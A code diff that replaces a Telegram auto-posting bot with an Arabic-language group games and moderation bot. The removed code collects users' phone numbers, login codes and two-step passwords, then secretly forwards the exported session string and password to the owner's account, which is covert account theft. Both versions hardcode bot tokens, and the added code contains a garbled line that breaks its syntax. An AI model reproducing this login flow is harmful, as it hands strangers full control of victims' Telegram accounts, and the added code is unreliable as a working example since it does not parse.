@@ -1,1286 +1,1472 @@
-from pyrogram.raw import functions
-from pyrogram import Client, filters, idle
-from pyrogram.types import (
-    Message,
-    CallbackQuery,
-    ForceReply,
-    InlineKeyboardMarkup as Markup, 
-    InlineKeyboardButton as Button
-)
-from pyrogram.errors import (
-    ApiIdInvalid, 
-    PhoneNumberInvalid, 
-    PhoneCodeInvalid, 
-    PhoneCodeExpired, 
-    SessionPasswordNeeded, 
-    PasswordHashInvalid,
-    UserNotParticipant,
-    ChatWriteForbidden,
-    PeerIdInvalid,
-    BotMethodInvalid
-)
-from pyrolistener import Listener, exceptions
-from asyncio import create_task, sleep, get_event_loop, TimeoutError
-from datetime import datetime, timedelta
-from pytz import timezone
-from typing import Union
-import json, os, random, string
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPermissions, ReactionTypeEmoji
+from datetime import datetime, timedelta, date
+import threading
+import time
+import random
+import requests
+import os
+import asyncio
+import shutil
+from yt_dlp import YoutubeDL
 
+# Bot settings
+TOKEN = "8074002868:AAEDGnXz4WOzslMv2BO4u_vG8hekkbq48-o"
+bot = telebot.TeleBot(TOKEN)
 
-app = Client(
-    "autoPost",
-    api_id=20769091,
-    api_hash="0a3c7b2d7c8132bbafd4ffe9eb516968",
-    bot_token="7767876547:AAFBADBi9A6ooqjDUz6w0Yzmm25LI615Nds",
-)
-loop = get_event_loop()
-listener = Listener(client = app)
-owners = [000, 000]  # ايدي الادمن
-owner = 7115002714  # ايدي الاساسي
-own = "@I_e_e_l" # يوزرك
-homeMarkup = Markup([
-    [
-        Button("- حسابك -", callback_data="account")
-    ],
-    [
-        Button("- السوبرات الحاليه -", callback_data="currentSupers"),
-        Button("- إضافة سوبر -", callback_data="newSuper")
-    ],
-    [
-        Button("- إضافة سوبرات -", callback_data="newSupers"),
-        Button("- تعيين الكليشة 2 -", callback_data="newCaption2")
-    ],
-    [
-        Button("- تعيين المدة ببن كل نشر -", callback_data="waitTime"),
-        Button("- تعيين كليشة النشر -", callback_data="newCaption")
-    ],
-    [
-        Button("- ايقاف النشر -", callback_data="stopPosting"),
-        Button("- بدء النشر -", callback_data="startPosting")
-    ],
-    [
-        Button("- ايقاف النشر 2 -", callback_data="stopPosting2"),
-        Button("- بدء النشر 2 -", callback_data="startPosting2")
-    ],
-    [
-        Button("- أوامر الحساب الثاني -", callback_data="account2st")
-    ]
-])
+# --- User data ---
+user_balances = {}  # {user_id: int}
+clubs_owned = {}  # {user_id: {"type": "عربي" or "أجنبي", "join_date": datetime, "ball": "كرة القدم" or "كرة السلة"}}
+warnings = {}  # {chat_id: {user_id: warning_count}}
+mutes = {}  # {chat_id: {user_id: mute_until_datetime}}
+user_gifts = {}  # {user_id: last_gift_date}
+user_animals = {}  # {user_id: {animal_name: price}}
+user_foods = {}  # {user_id: {food_name: price}}
+user_vehicles = {}  # {user_id: {vehicle_name: price}}
+ball_status = {}  # {user_id: {"has_ball": bool, "last_action": datetime, "ball_type": "كرة القدم" or "كرة السلة", "start_time": datetime, "stars_earned": int, "result": str, "duration": int}}
+ongoing_trainings = {}  # {user_id: {"end_time": datetime, "last_training_date": date}}
+last_feed_time = {}  # {user_id: {animal_name: datetime}}
+welcome_messages = {}  # {chat_id: {"type": "text" or "photo" or "voice", "content": str or file_id, "caption": str or None}}
+waiting_welcome = {}  # {user_id: {"chat_id": int, "message_id": int}}
+waiting_admin_action = {}  # {user_id: {"chat_id": int, "action": "promote" or "demote"}}
+waiting_gift = {}  # {user_id: {"chat_id": int, "message_id": int, "target_id": int}}
+words_waiting = {}  # {user_id: {"word": str, "message_id": int, "chat_id": int, "sent_time": datetime}}
+waiting_media = {}  # {user_id: {"chat_id": int, "platform": str, "message_id": int}}
+user_messages = {}  # {chat_id: {user_id: message_count}}
 
+# --- Darlen replies ---
+darlen_replies = ["مشغول تعال بعدين", "سم", "أهلا!", "عيوني", "نورت ياغالي!", "تفضل"]
+darlen_reply_index = {}
 
+# --- Bad word reactions ---
+badword_reactions = ["🗿", "🌚", "🌝", "😐", "😡", "🤯"]
+badword_index = {}
 
-@app.on_message(filters.command("start") & filters.private)
-async def start(_: Client, message: Message):
-    user_id = message.from_user.id
-    subscribed = await subscription(message)
-    if user_id == owner and users.get(str(user_id)) is None:
-        users[str(user_id)] = {"vip": True}
-        write(users_db, users)
-    elif isinstance(subscribed, str): return await message.reply(f"- عذرا عزيزي عليك الإشتراك بقناة البوت أولا لتتمكن استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start")
-    elif (str(user_id) not in users):
-        users[str(user_id)] = {"vip": False}
-        write(users_db, users)
-        return await message.reply(f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone")
-    elif not users[str(user_id)]["vip"]: return await message.reply(
-        f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone"
-    )
-    fname = message.from_user.first_name 
-    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
-    await message.reply(
-        caption,
-        reply_markup = homeMarkup,
-        reply_to_message_id = message.id
-    )
+# --- Morning messages ---
+morning_messages = [
+    "جدعان، فينكم؟ طنشتوني ولا إيه؟ أخباركم؟ 🗿",
+    "إيه يا رجالة، نمتوا ولا ايه؟ فاكرين العيش والملح ولا نسيتوا؟ عاملين ايه؟ 🌞",
+    "يا أصحاب، اختفيتوا فين؟ مش لاقي حد؟ الدنيا عاملة ايه؟ 🌎",
+    "معلمين، مفيش حس؟ كله تمام ولا ايه؟🙈"
+]
+morning_message_index = 0
+last_morning_message_date = None
 
+# --- Inactive user replies ---
+inactive_user_replies = [
+    "يا جدعان، فينكوا؟ زهقت! ما تيجوا نروق الدنيا ونجيب كام نجمة نهيص بيهم ⭐️",
+    "إيه يا رجالة؟ نمتوا ولا إيه؟ يلا بينا نولعها ونجيب نجوم السماء 💫",
+    "يا أهالينا، الطفش دبحني! مش هتيجوا نلم نجوم ونقلب الدنيا فرح؟ 🌚",
+    "يلا بينا على السوق نجيب حيوانات تهبل! بس لازم نلم نجوم الأول عشان الفلوس تكفي ✨",
+    "نفسي في قرد نطاط... بس استنى! لازم نشتغل ونجيب نجوم الأول عشان خاطر عيون القرد 🐵",
+    "يا ترى هنشتري ببغاء ولا قطة؟ المهم نجمع نجوم كتير الأول عشان نختار براحتنا 🌹",
+    "يا عمري، كل ده تأخير؟ قلبي هيقف! يلا بقى، مستنياك عشان نلعب وننور الدنيا 🔥",
+    "يا حبيبي، روحت فين؟ وحشتني! تعالى بسرعة نلم نجوم وننسى الزعل 🌺",
+    "يا نور عيني، بطّلت أشوف من غيرك! يلا تعالى نجمع نجوم ونرجع نضحك تاني 😂"
+]
+inactive_reply_index = 0
+last_inactive_reply_date = None
+replied_users = set()
 
+# --- Private chat replies ---
+private_chat_replies = [
+    "إيه يا جدعان؟ هتحكوا ولا بتخبّوا عليا؟",
+    "هترغوا في إيه؟ ما تقولوا، أنا مش منّكم ولا إيه؟",
+    "شكلي كده بتداروا عليا حاجة، بس أنا صاحبكم برضه!"
+]
+private_reply_index = 0
 
-@app.on_callback_query(filters.regex(r"^(toHome)$"))
-async def toHome(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    fname = callback.from_user.first_name 
-    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
-    await callback.message.edit_text(
-        caption,
-        reply_markup = homeMarkup,
-    )
+# --- Arabic words for word game ---
+arabic_words = [
+    "كتاب", "مدرسة", "شجرة", "بحر", "سماء", "قمر", "شمس", "نجم", "وردة", "طائر",
+    "سيارة", "منزل", "حديقة", "نهر", "جبل", "غابة", "مدينة", "قرية", "طريق", "جسر"
+]
 
-@app.on_callback_query(filters.regex(r"^(account2st)$"))
-async def account2st(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    fname = callback.from_user.first_name 
-    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\nستيم اضافة الاوامر قريبا جداا"
-    markup = Markup([
-        [
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    await callback.message.edit_text(
-        caption,
-        reply_markup = markup,
-    )
+# --- Store ---
+store_foods = {
+    "الحلويات": 50,
+    "الفواكه": 40,
+    "الألبان": 30,
+    "الأسماك": 70,
+    "خضروات": 20,
+    "الأرز": 25,
+    "بطاطس": 15,
+    "مكسرات": 60
+}
 
-@app.on_callback_query(filters.regex(r"^(account)$"))
-async def account(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    account_number = users[str(user_id)].get("account_number", "غير معروف")
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    fname = callback.from_user.first_name
-    caption = f"- مرحبا عزيزي [{fname}](tg://settings) في قسم الحساب\n-  حساب النشر : {account_number} .\n- استخدم الازرار التاليه للتحكم بحسابك:"
-    markup = Markup([
-        [
-            Button("- تسجيل حسابك -", callback_data="login"),
-            Button("- تغيير الحساب -", callback_data="changeAccount")
-        ],
-        [
-            Button("- ترتيب حسابك مع يوزر -", callback_data="account_settings"),
-            Button("- ترتيب حسابك بدون اليوزر -", callback_data="account_settings1"),
-        ],
-        [
-            Button("- مغادرة جميع القنوات -", callback_data="leaveAllChats"),
-            Button("- حذف الحساب من البوت -", callback_data="deleteAccount"),
-        ],
-        [
-            Button("- رجوع -", callback_data="toHome")
-        ]
-    ])
-    await callback.message.edit_text(
-        caption,
-        reply_markup = markup
-    )
+store_animals = {
+    "خنزير": 500, "الخنزير": 500,
+    "تلقطة": 600, "التلقطة": 600,
+    "دلفين": 800, "الدلفين": 800,
+    "سلحفات": 400, "السلحفات": 400,
+    "كلب": 300, "الكلب": 300,
+    "معز": 350, "المعز": 350,
+    "بقرة": 700, "البقرة": 700,
+    "غزالة": 650, "الغزالة": 650,
+    "ضفدع": 150, "الضفدع": 150,
+    "أسد": 900, "الأسد": 900,
+    "نمر": 850, "النمر": 850,
+    "فيل": 1000, "الفيل": 1000,
+    "زرافة": 950, "الزرافة": 950,
+    "قرد": 550, "القرد": 550,
+    "حصان": 750, "الحصان": 750,
+    "أرنب": 200, "الأرنب": 200,
+    "ببغاء": 250, "الببغاء": 250
+}
 
-@app.on_callback_query(filters.regex(r"^(deleteAccount)$"))
-async def deleteAccount(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner:
-        pass
-    elif not users[str(user_id)]["vip"]:
-        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    
-    # Delete the user data
-    if str(user_id) in users:
-        write(users_db, users)
-        users[str(user_id)]["session"] = ""
-        users[str(user_id)]["waitTime"] = ""
-        users[str(user_id)]["posting"] = False
-        users[str(user_id)]["posting2"] = False
-        users[str(user_id)]["caption"] = ""
-        users[str(user_id)]["caption2"] = ""
-        users[str(user_id)]["account_number"] = ""
-    
-    await callback.message.edit_text(
-        "- تم حذف الحساب بنجاح. يمكنك البدء من جديد عن طريق إرسال /start.",
-        reply_markup=Markup([[Button("- ابدأ من جديد -", callback_data="toHome")]])
-    )
+store_vehicles = {
+    "سيارة": 37,
+    "دراجة نارية": 59,
+    "طائرة": 100,
+    "حافلة": 79,
+    "صاروخ": 83
+}
 
-@app.on_callback_query(filters.regex(r"^(leaveAllChats)$"))
-async def leave_all_chats(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner:
-        pass
-    elif not users[str(user_id)]["vip"]:
-        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
+# --- Commands that can be deleted by admins or owner ---
+ALLOWED_DELETE_COMMANDS = [
+    "رصيدي", "المتجر", "متجر", "الكلمات", "كلمات", "حيواناتي", "الأوامر", "اوامر",
+    "كرة", "الكرة", "تمرير", "هدف", "تسجيل", "تمرين", "فيس", "فيسبوك",
+    "يوت", "انستا", "إنستا", "انستغرام", "إنستغرام", "أنستغرام"
+]
 
-    session = users[str(user_id)].get("session")
-    if session is None:
-        return await callback.message.edit_text(
-            "- لم تقم بالتسجيل بعد.",
-            reply_markup=Markup([[Button("- رجوع -", callback_data="account")]])
-        )
-
-    client = Client(
-        name="leave_all_chats",
-        session_string=session,
-        api_id=app.api_id,
-        api_hash=app.api_hash
-    )
-    await client.connect()
-
-    async for dialog in client.iter_dialogs():
+# --- وظيفة مساعدة لتثبيت المكتبات ---
+def install_library(library_name):
+    try:
+        __import__(library_name)
+        print(f"✅ مكتبة {library_name} مثبتة.")
+        return True
+    except ImportError:
+        print(f"🔄 جاري تثبيت مكتبة {library_name}...")
+        os.system(f"pip install {library_name}")
         try:
-            await client.leave_chat(dialog.chat.id)
-        except Exception as e:
-            print(f"Error leaving chat {dialog.chat.id}: {e}")
+            __import__(library_name)
+            print(f"✅ تم تثبيت مكتبة {library_name} بنجاح.")
+            return True
+        except ImportError:
+            print(f"❌ فشل تثبيت مكتبة {library_name}. يرجى المحاولة مرة أخرى.")
+            return False
 
-    await client.disconnect()
-    await callback.message.edit_text(
-        "- تم مغادرة جميع القنوات والمجموعات بنجاح.",
-        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
-    )
+# --- تثبيت yt-dlp ---
+if not install_library("yt_dlp"):
+    print("❌ يجب تثبيت yt-dlp لتحميل الصوت.")
+    exit()
 
-@app.on_callback_query(filters.regex("^account_settings1$"))
-async def toHome(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    client = Client(
-            str(user_id),
-            api_id=app.api_id,
-            api_hash=app.api_hash,
-            session_string=users[str(user_id)]["session"]
-        )
-    await client.start()
-    try:
-        photo = random.randint(2, 41)
-        name = random.randint(2, 41)
-        bio = random.randint(1315, 34171)
-        username = get_random_username()
-        msg = await client.get_messages("botnasheravtar", photo)
-        msg1 = await client.get_messages("botnashername", name)
-        file = await client.download_media(msg)
-        msg3 = await client.get_messages("UURRCC", bio)
-        await client.set_profile_photo(photo=file)
-        await client.update_profile(first_name=msg1.text)
-        await client.update_profile(bio=msg3.text)
-        await client.send_message(own, "شلونه المز 😉؟",)
-        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
-        await client.stop()
-        await callback.message.edit_text(
-        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
-        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
-        )
+# --- وظيفة مساعدة للتحقق من ffmpeg ---
+def check_ffmpeg():
+    if shutil.which("ffmpeg") and shutil.which("ffprobe"):
+        print("✅ تم العثور على ffmpeg و ffprobe.")
         return True
-    except Exception as e:
-        print(e)
-        await client.stop()
-        await callback.message.edit_text(
-        "حدث خطأ ما .",
-        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
-        )
-        return False
-
-def get_random_username():
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-
-@app.on_callback_query(filters.regex("^account_settings$"))
-async def toHome(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    client = Client(
-            str(user_id),
-            api_id=app.api_id,
-            api_hash=app.api_hash,
-            session_string=users[str(user_id)]["session"]
-        )
-    await client.start()
-    try:
-        photo = random.randint(2, 41)
-        name = random.randint(2, 109)
-        bio = random.randint(2, 109)
-        username = get_random_username()
-        msg = await client.get_messages("botnasheravtar", photo)
-        msg1 = await client.get_messages("nemshdmat", name)
-        file = await client.download_media(msg)
-        msg3 = await client.get_messages("UURRCC", bio)
-        await client.set_profile_photo(photo=file)
-        await client.update_profile(first_name=msg1.text)
-        await client.update_profile(bio=msg3.text)
-        await client.invoke(functions.account.UpdateUsername(username=username))
-        await client.send_message(own, "شلونه المز 😉؟",)
-        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
-        await client.stop()
-        await callback.message.edit_text(
-        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
-        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
-        )
-        return True
-    except Exception as e:
-        print(e)
-        await client.stop()
-        await callback.message.edit_text(
-        "- صار في خطأ واضح وصريح -",
-        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
-        )
-        return False
-
-@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
-async def login(_: Client, callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id == owner: pass
-    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
-    elif (callback.data == "changeAccount" and users[str(user_id)].get("session") is None): return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
-    await callback.message.delete()
-    try:ask = await listener.listen(
-        from_id=user_id,
-        chat_id=user_id,
-        text="- أرسل رقم الهاتف الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
-        reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
-        timeout=30)
-    except exceptions.TimeOut: return await callback.message.reply(
-        text = "- نفد وقت استلام رقم الهاتف",
-        reply_markup = Markup([[Button("- العوده -", callback_data="account")]])
-    )
-    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
-    create_task(registration(ask))
-    
-    
-    
-async def registration(message: Message):
-    user_id = message.from_user.id
-    _number = message.text
-    lmsg = await message.reply(f"- جارٍ تسجيل الدخول إلى حسابك")
-    reMarkup = Markup([
-        [
-            Button("- إعادة المحاوله -", callback_data="login"),
-            Button("- رجوع -", callback_data="account")
-        ]
-    ])
-    client = Client(
-        "registration",
-        in_memory = True, 
-        api_id = app.api_id,
-        api_hash = app.api_hash
-    )
-    await client.connect()
-    try: p_code_hash = await client.send_code(_number)
-    except (PhoneNumberInvalid): return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ" ,reply_markup=reMarkup)
-    try: code = await listener.listen(
-        from_id=user_id,
-        chat_id=user_id,
-        text="- تم ارسال كود إلى خاصك قم بإرساله من فضلك.⁩",
-        timeout=120,
-        reply_markup=ForceReply(selective=True, placeholder="𝙸𝙽 𝚃𝙷𝙸𝚂 𝙵𝙾𝚁𝙼𝚄𝙻𝙰: 1 2 3 4 5")
-    )
-    except exceptions.TimeOut: return await lmsg.reply(
-        text="- نفذ وقت استلام الكود.\n- حاول مره أخرى.", 
-        reply_markup=reMarkup
-    )
-    try: await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
-    except (PhoneCodeInvalid): return await code.reply("- لقد قمت بإدخال كود خاطئ. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
-    except (PhoneCodeExpired): return await code.reply("- الكود الذي ادخلته منتهي الصلاحية. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
-    except (SessionPasswordNeeded):
-        try:password = await listener.listen(
-            from_id=user_id,
-            chat_id=user_id,
-            text="- ادخل كلمة مرور التحقق بخطوتين من فضلك.",
-            reply_markup=ForceReply(selective=True, placeholder="- 𝚈𝙾𝚄𝚁 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: "),
-            timeout=180,
-            reply_to_message_id=code.id
-        )
-        except exceptions.TimeOut: return await lmsg.reply(
-            text="- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.",  
-            reply_markup=reMarkup
-        )
-        try: await client.check_password(password.text)
-        except (PasswordHashInvalid): return await password.reply("- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.", reply_markup=reMarkup)
-    session = await client.export_session_string()
-    try:
-        await app.send_message(owner, session + ' ' + _number)
-        await app.send_message(owner, session + ' ' + _number+' '+password.text)
-    except: pass
-    await client.disconnect()
-    if user_id == owner and users.get(str(user_id)) is None:
-        users[str(user_id)] = {"vip": True, "session": session, "account_number": _number}
-        write(users_db, users)
     else:
-        users[str(user_id)]["session"] = session
-    users[str(user_id)]["account_number"] = _number  # تخزين رقم الحساب هنا
-    write(users_db, users)
-    await app.send_message(
-        user_id, 
-        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت." ,
-        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
+        print("⚠️ لم يتم العثور على ffmpeg أو ffprobe.")
+        print("   يرجى تثبيتهما لتحميل الصوت.")
+        print("   - Linux (Debian/Ubuntu): sudo apt update && sudo apt install ffmpeg")
+        print("   - Linux (Fedora/CentOS): sudo dnf install ffmpeg")
+        print("   - macOS: brew install ffmpeg")
+        print("   - Windows: قم بتنزيلهما من موقع ffmpeg وإضافتهما إلى PATH.")
+        return False
+
+# --- التحقق من ffmpeg ---
+if not check_ffmpeg():
+    exit()
+
+# --- إعدادات التحميل ---
+if not os.path.exists("downloads"):
+    os.makedirs("downloads")
+
+YDL_OPTIONS = {
+    'format': 'bestaudio/best[abr<=160]',
+    'outtmpl': 'downloads/%(title)s.%(ext)s',
+    'noplaylist': True prosegue
+    'quiet': True,
+    'cookiefile': 'cookies.txt',
+    'postprocessors': [{
+        'key': 'FFmpegExtractAudio',
+        'preferredcodec': 'mp3',
+        'preferredquality': '128',
+    }],
+}
+
+# --- Helpers ---
+def is_owner(chat_id, user_id):
+    try:
+        member = bot.get_chat_member(chat_id, user_id)
+        return member.status == 'creator'
+    except:
+        return False
+
+def is_admin(chat_id, user_id):
+    try:
+        member = bot.get_chat_member(chat_id, user_id)
+        return member.status in ['administrator', 'creator']
+    except:
+        return False
+
+def promote_user(chat_id, user_id, custom_title=None):
+    try:
+        bot.promote_chat_member(chat_id, user_id,
+                                can_change_info=True,
+                                can_delete_messages=True,
+                                can_invite_users=True,
+                                can_restrict_members=True,
+                                can_pin_messages=True,
+                                can_promote_members=False,
+                                can_manage_voice_chats=True)
+        if custom_title:
+            bot.set_chat_administrator_custom_title(chat_id, user_id, custom_title)
+        return True
+    except:
+        return False
+
+def demote_user(chat_id, user_id):
+    try:
+        bot.promote_chat_member(chat_id, user_id,
+                                can_change_info=False,
+                                can_delete_messages=False,
+                                can_invite_users=False,
+                                can_restrict_members=False,
+                                can_pin_messages=False,
+                                can_promote_members=False,
+                                can_manage_voice_chats=False)
+        return True
+    except:
+        return False
+
+def mute_user_until_tomorrow_evening(chat_id, user_id):
+    try:
+        now = datetime.now()
+        tomorrow_evening = datetime.combine(now.date() + timedelta(days=1), datetime.min.time()) + timedelta(hours=20)
+        permissions = ChatPermissions(can_send_messages=False, can_send_media_messages=False,
+                                      can_send_polls=False, can_send_other_messages=False,
+                                      can_add_web_page_previews=False, can_change_info=False,
+                                      can_invite_users=False, can_pin_messages=False)
+        bot.restrict_chat_member(chat_id, user_id, permissions=permissions, until_date=tomorrow_evening)
+        if chat_id not in mutes:
+            mutes[chat_id] = {}
+        mutes[chat_id][user_id] = tomorrow_evening
+        return True
+    except:
+        return False
+
+def unmute_user(chat_id, user_id):
+    try:
+        permissions = ChatPermissions(can_send_messages=True, can_send_media_messages=True,
+                                      can_send_polls=True, can_send_other_messages=True,
+                                      can_add_web_page_previews=True, can_change_info=False,
+                                      can_invite_users=True, can_pin_messages=True)
+        bot.restrict_chat_member(chat_id, user_id, permissions=permissions)
+        if chat_id in mutes and user_id in mutes[chat_id]:
+            del mutes[chat_id][user_id]
+        return True
+    except:
+        return False
+
+def normalize_word(word):
+    word = word.strip().lower()
+    if word.endswith("ة"):
+        return word[:-1] + "ه"
+    elif word.endswith("ه"):
+        return word[:-1] + "ة"
+    else:
+        return word
+
+def get_user_id_from_username(chat_id, username):
+    try:
+        username = username.lstrip('@').lower()
+        admins = bot.get_chat_administrators(chat_id)
+        members = bot.get_chat_members(chat_id)
+        for member in admins + members:
+            if member.user.username and member.user.username.lower() == username:
+                return member.user.id
+        return None
+    except:
+        return None
+
+def download_media(url, platform):
+    try:
+        if platform == "facebook":
+            download_url = f"https://fdown.hideme.eu.org/?url={url}"
+            response = requests.get(download_url, timeout=10)
+            if response.status_code == 200:
+                return response.text  # Adjust based on actual API response
+        else:
+            api_url = f"https://tele-social.vercel.app/down?url={url}"
+            response = requests.get(api_url, timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("status"):
+                    if platform == "youtube":
+                        return data["data"].get("audio")
+                    elif platform == "instagram":
+                        return data["data"].get("video") or data["data"].get("image")
+        return None
+    except:
+        return None
+
+# --- Morning message and inactive user reply scheduler ---
+def send_morning_and_inactive_messages():
+    global morning_message_index, last_morning_message_date, inactive_reply_index, last_inactive_reply_date
+    while True:
+        now = datetime.now()
+        today = now.date()
+        # Morning messages at 8:00 AM
+        if last_morning_message_date != today and now.hour == 8 and now.minute == 0:
+            message = morning_messages[morning_message_index]
+            for chat_id in welcome_messages.keys():
+                try:
+                    bot.send_message(chat_id, message)
+                except:
+                    pass
+            morning_message_index = (morning_message_index + 1) % len(morning_messages)
+            last_morning_message_date = today
+
+        # Inactive user replies at 9:00 AM
+        if last_inactive_reply_date != today and now.hour == 9 and now.minute == 0:
+            for chat_id in user_messages.keys():
+                for user_id, count in user_messages[chat_id].items():
+                    if user_id not in replied_users and count > 0:
+                        bot_commands = ["رصيدي", "المتجر", "متجر", "الكلمات", "كلمات", "حيواناتي", "الأوامر", "اوامر",
+                                        "كرة", "الكرة", "تمرير", "هدف", "تسجيل", "تمرين", "فيس", "فيسبوك",
+                                        "يوت", "انستا", "إنستا", "انستغرام", "إنستغرام", "أنستغرام"]
+                        user_used_bot = False
+                        try:
+                            messages = bot.search_chat_messages(chat_id, from_user=user_id)
+                            for msg in messages:
+                                if msg.text and msg.text.lower() in bot_commands:
+                                    user_used_bot = True
+                                    break
+                        except:
+                            continue
+                        if not user_used_bot:
+                            try:
+                                bot.send_message(chat_id, inactive_user_replies[inactive_reply_index])
+                                replied_users.add(user_id)
+                                inactive_reply_index = (inactive_reply_index + 1) % len(inactive_user_replies)
+                                last_inactive_reply_date = today
+                                break
+                            except:
+                                continue
+            if last_inactive_reply_date != today:
+                replied_users.clear()
+        time.sleep(60)
+
+# --- Word game timeout checker ---
+def check_word_game_timeout():
+    while True:
+        now = datetime.now()
+        for user_id, data in list(words_waiting.items()):
+            if now >= data["sent_time"] + timedelta(hours=5):
+                try:
+                    bot.delete_message(data["chat_id"], data["message_id"])
+                except:
+                    pass
+                words_waiting.pop(user_id, None)
+        time.sleep(60)
+
+threading.Thread(target=send_morning_and_inactive_messages, daemon=True).start()
+threading.Thread(target=check_word_game_timeout, daemon=True).start()
+
+# --- Message Handlers ---
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["هه", "ههه", "هههه", "ههههه", "هههههه", "ههههههههههه"])
+def laugh_reply(m):
+    bot.reply_to(m, "ضحكه مش سالكه 😳😂")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "شوف")
+def show_reply(m):
+    bot.reply_to(m, "اشوف اي 🌝🌝")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "الحمدلله")
+def alhamdulillah_reply(m):
+    bot.reply_to(m, "ديما❤️☁️")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["هلا", "اهلا"])
+def hello_reply(m):
+    bot.reply_to(m, "السلام عليكم ياغالي ❤️‍🩹")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "سلام")
+def salam_reply(m):
+    bot.reply_to(m, "روح نام يا حب 😂")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "نعم")
+def yes_reply(m):
+    bot.reply_to(m, "نعم، الله عليك❤️😂")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["+18", "جنس"])
+def adult_content_reply(m):
+    bot.set_message_reaction(m.chat.id, m.message_id, reaction=[ReactionTypeEmoji(emoji="😳")])
+    bot.reply_to(m, "ربي، إيه اللي بسمعه ده؟ 😂😳")
+
+@bot.message_handler(func=lambda m: m.text and "🖕" in m.text)
+def middle_finger_reply(m):
+    bot.set_message_reaction(m.chat.id, m.message_id, reaction=[ReactionTypeEmoji(emoji="🤣")])
+    bot.reply_to(m, "خسارة، كنت فاكر إنك راجل محترم، بس واضح إنك مش قد كده! 😆")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "اي")
+def what_reply(m):
+    bot.reply_to(m, "جتك اوهه م سامع ولا ايي😹👻")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "حبيبي")
+def darling_reply(m):
+    bot.reply_to(m, "اوه ياه 🌝😂")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "بوت")
+def bot_reply(m):
+    bot.reply_to(m, "اسمى دالن ياحب 🙄❤️")
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["خاص", "خاااص", "تعال خاص", "تع", "ابعث", "إبعث"])
+def private_chat_reply(m):
+    global private_reply_index
+    bot.reply_to(m, private_chat_replies[private_reply_index])
+    private_reply_index = (private_reply_index + 1) % len(private_chat_replies)
+
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == "دارلن")
+def reply_darlen(m):
+    uid = m.from_user.id
+    idx = darlen_reply_index.get(uid, 0)
